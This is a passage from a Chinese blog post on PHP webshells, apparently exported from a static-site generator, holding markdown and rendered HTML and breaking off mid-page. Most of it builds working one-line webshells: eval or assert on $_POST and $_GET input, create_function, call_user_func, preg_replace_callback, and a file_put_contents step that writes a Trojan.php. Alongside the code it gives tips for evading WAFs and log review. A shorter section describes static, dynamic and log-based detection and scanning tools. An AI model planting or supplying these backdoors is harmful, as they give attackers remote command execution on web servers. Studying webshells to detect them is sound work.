方法代码部分\n```\n\n注意当我们使用此匿名函数的时候，方法代码部分会被执行。\n\n```php+HTML\n<?php\n//eval(system('date'));\n//$tmp='system(\"'.$_GET[cmd].'\");';\n//eval($tmp);\n//@eval($_POST[cmd]);\n//assert(system(\"date\"));\n//assert($_GET['cmd']);\n$tmp = create_function('',system('date'));\n$tmp();\n?>\n```\n\n![image-20200910203507277](/images/webshell/image-20200910203507277.png)\n\n\n\n构造一句话木马\n\n```php+HTML\n<?php\n$tmp = create_function('',$_POST['cmd']);\n$tmp();\n?>\n```\n\n把用户传递的数据生成一个函数 tmp()，然后再执行 tmp()：\n\n![image-20200910203732113](/images/webshell/image-20200910203732113.png)\n\n##### call_user_func\n\n`call_user_func` 这个函数可以调用其它函数，被调用的函数是 `call_user_func` 的第一个函数，被调用的函数的参数是 `call_user_func` 的第二个参数。这样的一个语句也可以完成一句话木马。一些被 waf 拦截的木马可以配合这个函数绕过 waf。\n\n```php+HTML\n<?php\n//eval(system('date'));\n//$tmp='system(\"'.$_GET[cmd].'\");';\n//eval($tmp);\n//@eval($_POST[cmd]);\n//assert(system(\"date\"));\n//assert($_GET['cmd']);\n//$tmp = create_function('',system('date'));\n//$tmp();\n\n//$tmp = create_function('',$_POST['cmd']);\n//$tmp();\n\ncall_user_func(system(\"date\"));\n\n?>\n```\n\n![image-20200910205446756](/images/webshell/image-20200910205446756.png)\n\n其实所有的一句话木马都由两部分组成：\n\n1. 接收攻击者输入\n2. 命令执行函数\n\n在`PHP Version 7.3.4`，webshell 是无法回显的.\n\n```php+HTML\n<?php\n//eval(system('date'));\n//$tmp='system(\"'.$_GET[cmd].'\");';\n//eval($tmp);\n//@eval($_POST[cmd]);\n//assert(system(\"date\"));\n//assert($_GET['cmd']);\n//$tmp = create_function('',system('date'));\n//$tmp();\n\n//$tmp = create_function('',$_POST['cmd']);\n//$tmp();\n\n//call_user_func(system(\"date\"));\ncall_user_func(assert,$_POST['cmd']);\n//@call_user_func(assert,phpinfo());\n\n?>\n```\n\n如下图所示显示为空\n\n![image-20200910210011420](/images/webshell/image-20200910210011420.png)\n\n绕过\n\n```php+HTML\n<?php\n//eval(system('date'));\n//$tmp='system(\"'.$_GET[cmd].'\");';\n//eval($tmp);\n//@eval($_POST[cmd]);\n//assert(system(\"date\"));\n//assert($_GET['cmd']);\n//$tmp = create_function('',system('date'));\n//$tmp();\n\n//$tmp = create_function('',$_POST['cmd']);\n//$tmp();\n\n//call_user_func(system(\"date\"));\n//call_user_func(assert,$_POST['cmd']);\n@call_user_func(assert,phpinfo());\n\n?>\n```\n\n![image-20200910210301627](/images/webshell/image-20200910210301627.png)\n\n\n\n由以上`assert()`函数介绍，给 assert() 函数传入字符串参数，这个特性在 7.2 禁用。\n\n因为通过超全局常量 `$_GET['']`获取的攻击者输入是字符串，这样传入assert函数就触发了禁用。\n\n但是直接`assert(phpinfo())`传入的参数是函数，所以就不会触发函数禁用，可以正常回显。\n\n此时更换PHP版本为`7.0.33`如下图所示可以显示。\n\n```php+HTML\n<?php\n//eval(system('date'));\n//$tmp='system(\"'.$_GET[cmd].'\");';\n//eval($tmp);\n//@eval($_POST[cmd]);\n//assert(system(\"date\"));\n//assert($_GET['cmd']);\n//$tmp = create_function('',system('date'));\n//$tmp();\n\n//$tmp = create_function('',$_POST['cmd']);\n//$tmp();\n\n//call_user_func(system(\"date\"));\n//call_user_func(assert,$_POST['cmd']);\n//@call_user_func(assert,phpinfo());\n\n@call_user_func(assert,$_GET['cmd']);\n?>\n```\n\n![image-20200911104416978](/images/webshell/image-20200911104416978.png)\n\n更换7.1.20尝试，无法显示phpinfo信息\n\n![image-20200911104522817](/images/webshell/image-20200911104522817.png)\n\n这个禁用特性其实是从 php 7.1 版本开始，所以 `call_user_func + assert` 构造的一句话木马在 php 7.0 版本及以下可以使用。\n\n##### preg_replace_callback\n\n `preg_replace /e` 函数写 webshell，因为此函数5.5.0及以上版本已经被弃用了。使用 preg_replace_callback() 代替。\n\n```php+HTML\n<?php\n//eval(system('date'));\n//$tmp='system(\"'.$_GET[cmd].'\");';\n//eval($tmp);\n//@eval($_POST[cmd]);\n//assert(system(\"date\"));\n//assert($_GET['cmd']);\n//$tmp = create_function('',system('date'));\n//$tmp();\n\n//$tmp = create_function('',$_POST['cmd']);\n//$tmp();\n\n//call_user_func(system(\"date\"));\n//call_user_func(assert,$_POST['cmd']);\n//@call_user_func(assert,phpinfo());\n\n//@call_user_func(assert,$_GET['cmd']);\n\npreg_replace_callback('/.+/i', create_function('$arr', 'return assert($arr[0]);'), $_REQUEST['cmd']);\n\n?>\n```\n\n此 webshell 的原理为：通过 `create_function` “创造”一个函数，它接受一个数组，并将数组的第一个元素$arr[0]传入assert。\n\n![image-20200911105751006](/images/webshell/image-20200911105751006.png)\n\n##### file_put_contents\n\nwebshell 调试三部曲：\n\n1. 把函数写在 php 文件中，看能否执行\n2. 写成 `$_GET['']` 方式传入命令，看能否执行\n3. 写成 `$_POST['']`方式传入命令，能能否执行命令\n   `注：`2、3步可以合成通过`$_REQUEST['']`方法传入命令。\n\n```php+HTML\n<?php\n//eval(system('date'));\n//$tmp='system(\"'.$_GET[cmd].'\");';\n//eval($tmp);\n//@eval($_POST[cmd]);\n//assert(system(\"date\"));\n//assert($_GET['cmd']);\n//$tmp = create_function('',system('date'));\n//$tmp();\n\n//$tmp = create_function('',$_POST['cmd']);\n//$tmp();\n\n//call_user_func(system(\"date\"));\n//call_user_func(assert,$_POST['cmd']);\n//@call_user_func(assert,phpinfo());\n\n//@call_user_func(assert,$_GET['cmd']);\n\n//preg_replace_callback('/.+/i', create_function('$arr', 'return assert($arr[0]);'), $_REQUEST['cmd']);\n\n$test='<?php $a=$_POST[\"cmd\"];assert($a); ?>';\nfile_put_contents(\"Trojan.php\", $test);\n?>\n```\n\n上面这个 webshell 利用函数生成 `Trojan.php` 木马文件。\n`file_put_contents` 函数：生成一个文件。第一个参数是文件名，第二个参数是文件的内容。\n\n![image-20200911110201716](/images/webshell/image-20200911110201716.png)\n\n![image-20200911110325971](/images/webshell/image-20200911110325971.png)\n\n如上图所示：命令成功执行\n\n##### exec\n\nexec()功能是将命令作为参数，但不输出结果。如果指定了第二个可选参数，则返回结果为数组。否则，如果回显，只显示结果的最后一行。\n\n```php+HTML\n<?php\nexec(\"ls\")\n//echo exec(\"ls\");\n?>\n```\n\n无法回显，使用`exec()`函数执行echo命令，只会输出最后一行命令结果。\n\n```php+HTML\n<?php\n//exec(\"ls\")\necho exec(\"ls\");\n?>\n```\n\n![image-20200911111810853](/images/webshell/image-20200911111810853.png)\n\n如果指定了第二个参数，则返回结果为数组。\n\n```php+HTML\n<?php\n//exec(\"ls\")\nexec(\"ls\",$array);\nprint_r($array);\n?>\n```\n\n\n\n![image-20200911111954897](/images/webshell/image-20200911111954897.png)\n\n##### shell_exec\n\nshell_exec()函数类似于exec()，但是，其整个输出结果为字符串。\n\n```php+HTML\n<?php\necho shell_exec(\"ls -al\");\n?>\n```\n\n![image-20200911112228548](/images/webshell/image-20200911112228548.png)\n\n##### passthru\n\npassthru()执行一个命令并返回原始格式的输出.\n\n```php+HTML\n<?php\npassthru(\"ls -l\");\n?>\n```\n\n![image-20200911112637207](/images/webshell/image-20200911112637207.png)\n\n#### 检测手段\n\n##### 静态检测\n\n攻击者入侵服务器，使用Webshell，不管是传文件还是改文件，必然有一个文件会包含webshell代码，很容易想到从文件代码入手，这是静态特征检测。\n\n静态检测通过匹配特征码，特征值，危险函数函数来查找webshell的方法，只能查找已知的webshell，且误报、漏报率会比较高，但如果规则完善，可以减低误报率，但是漏报率必定会有所提高。优点是快速方便，对已知的webshell查找准确率高，部署方便，一个脚本就能搞定。\n\n缺点漏报率、误报率高，无法查找0day型webshell，而且容易被绕过。对于单站点的网站，用静态检测还是有很大好处，配合人工，能快速定位webshell，但是如果是一个成千上万站点的大型企业呢，这个时候再人肉那工作量可就大了。\n\n因此用这样一种思路：强弱特征。即把特征码分为强弱两种特征，强特征命中则必是webshell；弱特征由人工去判断。加入一种强特征，即把流行webshell用到的特征作为强特征重点监控，一旦出现这样的特征即可确认为webshell立即进行响应。要解决误报和漏报，就不能拘泥于代码级别了。\n\n同时结合文件系统。结合文件的属性来判断，比如apache是noboy启动的，webshell的属主必然也是nobody，如果我的Web目录无缘无故多了个nobody属主的文件，这里就有问题了。最理想的办法是需要制度和流程来建设一个web目录唯一发布入口，控制住这个入口，非法进来的Web文件自然可以发现。\n\n##### 动态检测\n\nWebshell运行后，B/S数据通过HTTP交互，HTTP请求/响应中可以找到蛛丝马迹，这是动态特征检测。\n\nWebshell传到服务器了，总要去执行它，Webshell执行时刻表现出来的特征，我们称为动态特征。Webshell通信是HTTP协议。只要我们把Webshell特有的HTTP请求/响应做成特征库，加到IDS里面去检测所有的HTTP请求就好了。\n\nwebshell起来如果执行系统命令的话，会有进程。Linux下就是nobody用户起了bash，Win下就是IIS User启动cmd，这些都是动态特征。\n\n##### 日志检测\n\n访问Webshell一般不会在系统日志中留下记录，但是会在网站的`web日志`中留下Webshell页面的访问数据和数据提交记录。日志分析检测技术通过大量的日志文件建立请求模型从而检测出异常文件，称之为：HTTP异常请求模型检测。\n\n例如：一个平时是GET的请求改用POST请求并且返回代码为200、某个页面的访问者IP、访问时间具有规律性等。\n\n#### Tools\n\n以上介绍了部分检测手段，当然也少不了一些自动化工具(如下)，但是还需人工协助实现对Webshell检测的误报率。\n\n[findWebshell](https://github.com/he1m4n6a/findWebshell)\n\n一款本地检测Webshell工具，基本Webshell均可检测。可down到本地测试。检测脚本使用python编写。\n\n[D盾](http://www.d99net.net/News.asp?id=47)\n\n一款Windows客户端检测Webshell检测工具。较多人使用，具体使用下载本地测试即可。\n\n[河马](https://www.shellpub.com/)\n\n官网介绍：专注webshell查杀研究。拥有海量webshell样本和自主查杀技术，采用传统特征+云端大数据双引擎的查杀技术。查杀速度快、精度高、误报低。\n\n[安全狗](http://www.safedog.cn/)\n\n网站、服务器的检测，同时可以支持安全攻击防御，webshell检测等功能。\n\n#### Referer\n\n```\nhttps://www.jianshu.com/p/02aac12e459f\nhttp://blog.leanote.com/post/snowming/2e1ab18dfa80\nhttps://www.cnblogs.com/he1m4n6a/p/9245155.html\n```\n\n","slug":"Webshell检测","published":1,"updated":"2020-10-23T03:49:17.983Z","_id":"ckglobhdw000nb1hqg0xl2l01","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h4><p>Web：指的是在Web服务器，而shell是用脚本语言编写的脚本程序，Webshell就是就是Web的一个管理工具，可以对Web服务器进行操作的权限，也叫webadmin。</p>\n<p>Webshell一般是被网站管理员用于网站管理、服务器管理等等一些用途，但是由于webshell的功能比较强大，可以上传下载文件，查看数据库，甚至可以调用一些服务器上系统的相关命令（比如创建用户，修改删除文件之类的），通常被黑客利用，黑客通过一些上传方式，将自己编写的webshell上传到Web服务器的页面的目录下，然后通过页面访问的形式进行入侵，或者通过插入一句话连接本地的一些相关工具直接对服务器进行入侵操作。</p>\n<h4 id=\"分类\"><a href=\"#分类\" class=\"headerlink\" title=\"分类\"></a>分类</h4><h5 id=\"编程语言\"><a href=\"#编程语言\" class=\"headerlink\" title=\"编程语言\"></a>编程语言</h5><p>Webshell根据编程语言可以分为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PHP木马</span><br><span class=\"line\">ASP木马</span><br><span class=\"line\">.NET木马</span><br><span class=\"line\">JSP木马</span><br><span class=\"line\">python动态网页</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"功能\"><a href=\"#功能\" class=\"headerlink\" title=\"功能\"></a>功能</h5><p>根据功能分为<code>大马</code>、<code>小马</code>、<code>打包马</code>、<code>脱裤马</code>；</p>\n<p>小马通常指的一句话木马，体积较小，例如：<code>&lt;%eval request(“pass”)%&gt;</code>通常把这句话写入一个文档里面，然后修改xx.asp或php后缀。然后上传至服务器上。eval方法将request(“pass”)转换成代码执行，request函数的作用是应用外部文件。这相当于一句话木马的客户端配置。</p>\n<p>大马通常体积比较大 一般50K以上。功能也多，一般都包括提权命令，磁盘管理，数据库连接借口，执行命令甚至有些以具备自带提权功能和压缩，解压缩网站程序的功能。这种马隐蔽性不好，而大多代码如不加密的话很多杀毒厂商开始追杀此类程序。</p>\n<h4 id=\"常用函数\"><a href=\"#常用函数\" class=\"headerlink\" title=\"常用函数\"></a>常用函数</h4><p>由以上Webshell功能介绍了解到，它们使用各编程语编写并上传到目标服务器上执行；尝试获取系统命令、及网站web权限。因此需要使用对应编程语言内系统函数。</p>\n<p>（PHP语言示例）</p>\n<h5 id=\"system\"><a href=\"#system\" class=\"headerlink\" title=\"system\"></a>system</h5><p>函数将命令作为参数，并输出结果。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">eval(system(&#39;date&#39;));</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/webshell/image-20200910191501727.png\" alt=\"image-20200910191501727\"></p>\n<p> PHP 中的<code>超全局变量</code>(如<code>$_GET</code>、<code>$_POST</code>、<code>$_REQUEST</code>、<code>$_COOKIE</code>）获取攻击者的指令输入。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">&#x2F;&#x2F;eval(system(&#39;date&#39;));</span><br><span class=\"line\">$tmp&#x3D;&#39;system(&quot;&#39;.$_GET[cmd].&#39;&quot;);&#39;;</span><br><span class=\"line\">eval($tmp);</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/webshell/image-20200910192925561.png\" alt=\"image-20200910192925561\"></p>\n<p>这里还有点问题：</p>\n<ol>\n<li>使用了超全局变量 <code>$_GET</code> 来通过 get 方法获取用户的输入命令。但是 GET 方法有一些限制，第一是存在长度限制：特定的浏览器及服务器会对通过 get 方法提交的字符串有一定的限制。第二是当网站管理员查 log 的时候，会看到明文的 get 请求参数，容易被发现，相比之下， post 请求敏感内容不容易被发现。所以最好把 get 方法换成 post 方法。</li>\n<li>system 函数不应该被写进去。一方面是因为因为有时候 php 中的一些危险函数会被开发者或者网站管理人员禁用，我们可以先不写命令执行函数，攻击的时候可以自行选择更厉害的方法进行绕过。另一方面是写入了 system 这个一句话木马就只能执行命令了，但是不写的话通过使用不同的 payload 一个一句话木马其实啥都能做（就像一句话木马连上菜刀之后的功能），基本跟大马一样。</li>\n<li>在 eval 前面可以加一个 <code>@</code>，@是忽略可能出现的错误。</li>\n</ol>\n<p>因此最后形成的一句话木马：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">&#x2F;&#x2F;eval(system(&#39;date&#39;));</span><br><span class=\"line\">&#x2F;&#x2F;$tmp&#x3D;&#39;system(&quot;&#39;.$_GET[cmd].&#39;&quot;);&#39;;</span><br><span class=\"line\">&#x2F;&#x2F;eval($tmp);</span><br><span class=\"line\">@eval($_POST[cmd]);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/webshell/image-20200910201443491.png\" alt=\"image-20200910201443491\"></p>\n<h5 id=\"assert\"><a href=\"#assert\" class=\"headerlink\" title=\"assert\"></a>assert</h5><p>assert 这个函数在 php 语言中是用来判断一个表达式是否成立。返回 true or false；assert 函数的参数会被执行，这跟 eval() 类似。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">&#x2F;&#x2F;eval(system(&#39;date&#39;));</span><br><span class=\"line\">&#x2F;&#x2F;$tmp&#x3D;&#39;system(&quot;&#39;.$_GET[cmd].&#39;&quot;);&#39;;</span><br><span class=\"line\">&#x2F;&#x2F;eval($tmp);</span><br><span class=\"line\">&#x2F;&#x2F;@eval($_POST[cmd]);</span><br><span class=\"line\">assert(system(&quot;date&quot;));</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/webshell/image-20200910202300583.png\" alt=\"image-20200910202300583\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;post型</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">@assert($_POST[&#39;c&#39;]);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">给 assert() 函数传入字符串参数，这个特性在 7.2 禁用，在 8.0 版本时会被彻底删除。</span><br></pre></td></tr></table></figure>\n\n<p>注意：我们对一句话木马使用的一些 payload，比如 phpinfo() 或者 system(‘command’)，因为不是字符串，所以也就不受版本限制。</p>\n<p>如下所示：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">&#x2F;&#x2F;eval(system(&#39;date&#39;));</span><br><span class=\"line\">&#x2F;&#x2F;$tmp&#x3D;&#39;system(&quot;&#39;.$_GET[cmd].&#39;&quot;);&#39;;</span><br><span class=\"line\">&#x2F;&#x2F;eval($tmp);</span><br><span class=\"line\">&#x2F;&#x2F;@eval($_POST[cmd]);</span><br><span class=\"line\">&#x2F;&#x2F;assert(system(&quot;date&quot;));</span><br><span class=\"line\">assert($_GET[&#39;cmd&#39;]);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/webshell/image-20200910202837253.png\" alt=\"image-20200910202837253\"></p>\n<h5 id=\"create-function\"><a href=\"#create-function\" class=\"headerlink\" title=\"create_function\"></a>create_function</h5><p>在php中，函数<code>create_function</code>主要用来创建匿名函数。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">string create_function(string $args, string $code)</span><br><span class=\"line\">string $args 变量部分</span><br><span class=\"line\">string $code 方法代码部分</span><br></pre></td></tr></table></figure>\n\n<p>注意当我们使用此匿名函数的时候，方法代码部分会被执行。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">&#x2F;&#x2F;eval(system(&#39;date&#39;));</span><br><span class=\"line\">&#x2F;&#x2F;$tmp&#x3D;&#39;system(&quot;&#39;.$_GET[cmd].&#39;&quot;);&#39;;</span><br><span class=\"line\">&#x2F;&#x2F;eval($tmp);</span><br><span class=\"line\">&#x2F;&#x2F;@eval($_POST[cmd]);</span><br><span class=\"line\">&#x2F;&#x2F;assert(system(&quot;date&quot;));</span><br><span class=\"line\">&#x2F;&#x2F;assert($_GET[&#39;cmd&#39;]);</span><br><span class=\"line\">$tmp &#x3D; create_function(&#39;&#39;,system(&#39;date&#39;));</span><br><span class=\"line\">$tmp();</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/webshell/image-20200910203507277.png\" alt=\"image-20200910203507277\"></p>\n<p>构造一句话木马</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$tmp &#x3D; create_function(&#39;&#39;,$_POST[&#39;cmd&#39;]);</span><br><span class=\"line\">$tmp();</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>把用户传递的数据生成一个函数 tmp()，然后再执行 tmp()：</p>\n<p><img src=\"/images/webshell/image-20200910203732113.png\" alt=\"image-20200910203732113\"></p>\n<h5 id=\"call-user-func\"><a href=\"#call-user-func\" class=\"headerlink\" title=\"call_user_func\"></a>call_user_func</h5><p><code>call_user_func</code> 这个函数可以调用其它函数，被调用的函数是 <code>call_user_func</code> 的第一个函数，被调用的函数的参数是 <code>call_user_func</code> 的第二个参数。这样的一个语句也可以完成一句话木马。一些被 waf 拦截的木马可以配合这个函数绕过 waf。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">&#x2F;&#x2F;eval(system(&#39;date&#39;));</span><br><span class=\"line\">&#x2F;&#x2F;$tmp&#x3D;&#39;system(&quot;&#39;.$_GET[cmd].&#39;&quot;);&#39;;</span><br><span class=\"line\">&#x2F;&#x2F;eval($tmp);</span><br><span class=\"line\">&#x2F;&#x2F;@eval($_POST[cmd]);</span><br><span class=\"line\">&#x2F;&#x2F;assert(system(&quot;date&quot;));</span><br><span class=\"line\">&#x2F;&#x2F;assert($_GET[&#39;cmd&#39;]);</span><br><span class=\"line\">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,system(&#39;date&#39;));</span><br><span class=\"line\">&#x2F;&#x2F;$tmp();</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,$_POST[&#39;cmd&#39;]);</span><br><span class=\"line\">&#x2F;&#x2F;$tmp();</span><br><span class=\"line\"></span><br><span class=\"line\">call_user_func(system(&quot;date&quot;));</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/webshell/image-20200910205446756.png\" alt=\"image-20200910205446756\"></p>\n<p>其实所有的一句话木马都由两部分组成：</p>\n<ol>\n<li>接收攻击者输入</li>\n<li>命令执行函数</li>\n</ol>\n<p>在<code>PHP Version 7.3.4</code>，webshell 是无法回显的.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">&#x2F;&#x2F;eval(system(&#39;date&#39;));</span><br><span class=\"line\">&#x2F;&#x2F;$tmp&#x3D;&#39;system(&quot;&#39;.$_GET[cmd].&#39;&quot;);&#39;;</span><br><span class=\"line\">&#x2F;&#x2F;eval($tmp);</span><br><span class=\"line\">&#x2F;&#x2F;@eval($_POST[cmd]);</span><br><span class=\"line\">&#x2F;&#x2F;assert(system(&quot;date&quot;));</span><br><span class=\"line\">&#x2F;&#x2F;assert($_GET[&#39;cmd&#39;]);</span><br><span class=\"line\">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,system(&#39;date&#39;));</span><br><span class=\"line\">&#x2F;&#x2F;$tmp();</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,$_POST[&#39;cmd&#39;]);</span><br><span class=\"line\">&#x2F;&#x2F;$tmp();</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;call_user_func(system(&quot;date&quot;));</span><br><span class=\"line\">call_user_func(assert,$_POST[&#39;cmd&#39;]);</span><br><span class=\"line\">&#x2F;&#x2F;@call_user_func(assert,phpinfo());</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>如下图所示显示为空</p>\n<p><img src=\"/images/webshell/image-20200910210011420.png\" alt=\"image-20200910210011420\"></p>\n<p>绕过</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">&#x2F;&#x2F;eval(system(&#39;date&#39;));</span><br><span class=\"line\">&#x2F;&#x2F;$tmp&#x3D;&#39;system(&quot;&#39;.$_GET[cmd].&#39;&quot;);&#39;;</span><br><span class=\"line\">&#x2F;&#x2F;eval($tmp);</span><br><span class=\"line\">&#x2F;&#x2F;@eval($_POST[cmd]);</span><br><span class=\"line\">&#x2F;&#x2F;assert(system(&quot;date&quot;));</span><br><span class=\"line\">&#x2F;&#x2F;assert($_GET[&#39;cmd&#39;]);</span><br><span class=\"line\">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,system(&#39;date&#39;));</span><br><span class=\"line\">&#x2F;&#x2F;$tmp();</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,$_POST[&#39;cmd&#39;]);</span><br><span class=\"line\">&#x2F;&#x2F;$tmp();</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;call_user_func(system(&quot;date&quot;));</span><br><span class=\"line\">&#x2F;&#x2F;call_user_func(assert,$_POST[&#39;cmd&#39;]);</span><br><span class=\"line\">@call_user_func(assert,phpinfo());</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/webshell/image-20200910210301627.png\" alt=\"image-20200910210301627\"></p>\n<p>由以上<code>assert()</code>函数介绍，给 assert() 函数传入字符串参数，这个特性在 7.2 禁用。</p>\n<p>因为通过超全局常量 <code>$_GET[&#39;&#39;]</code>获取的攻击者输入是字符串，这样传入assert函数就触发了禁用。</p>\n<p>但是直接<code>assert(phpinfo())</code>传入的参数是函数，所以就不会触发函数禁用，可以正常回显。</p>\n<p>此时更换PHP版本为<code>7.0.33</code>如下图所示可以显示。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">&#x2F;&#x2F;eval(system(&#39;date&#39;));</span><br><span class=\"line\">&#x2F;&#x2F;$tmp&#x3D;&#39;system(&quot;&#39;.$_GET[cmd].&#39;&quot;);&#39;;</span><br><span class=\"line\">&#x2F;&#x2F;eval($tmp);</span><br><span class=\"line\">&#x2F;&#x2F;@eval($_POST[cmd]);</span><br><span class=\"line\">&#x2F;&#x2F;assert(system(&quot;date&quot;));</span><br><span class=\"line\">&#x2F;&#x2F;assert($_GET[&#39;cmd&#39;]);</span><br><span 